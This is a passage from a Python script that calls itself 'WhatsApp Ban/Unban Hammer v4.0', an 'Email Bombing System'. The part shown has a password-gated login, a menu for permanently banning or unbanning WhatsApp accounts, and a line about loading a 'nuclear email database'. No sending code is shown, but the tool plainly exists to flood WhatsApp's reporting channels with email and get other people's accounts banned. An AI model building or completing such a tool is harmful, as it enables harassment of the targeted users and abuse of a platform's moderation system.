            print(Fore.CYAN + "   2. Ban Permanent (Instant)")
            print(Fore.CYAN + "   3. Unban Temporary (30-60 minutes)")
            print(Fore.CYAN + "   4. Unban Permanent (Restore)")
            print(Fore.YELLOW + "\n⚡ Loading nuclear email database...")
            time.sleep(2)
            return True
        else:
            login_attempts += 1
            remaining = MAX_LOGIN_ATTEMPTS - login_attempts
            print(Fore.RED + f"\n❌ ACCESS DENIED! {login_attempts}/{MAX_LOGIN_ATTEMPTS}")
            print(Fore.YELLOW + f"⚠️ Remaining attempts: {remaining}")
            
            if remaining > 0:
                time.sleep(2)
                clear()
            else:
                print(Fore.RED + "\n💀 SYSTEM LOCKED")
                time.sleep(3)
                exit()
    
    return False

# ===== Main Execution =====
if __name__ == "__main__":
    try:
        if login():
            main_menu()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n👋 Program interrupted")
    except Exception as e:
        print(Fore.RED + f"\n💥 ERROR: {e}")
    finally:
        print(Fore.CYAN + "\n🔥 WhatsApp Ban/Unban Hammer v4.0")
        print(Fore.YELLOW + "📧 Email Bombing System")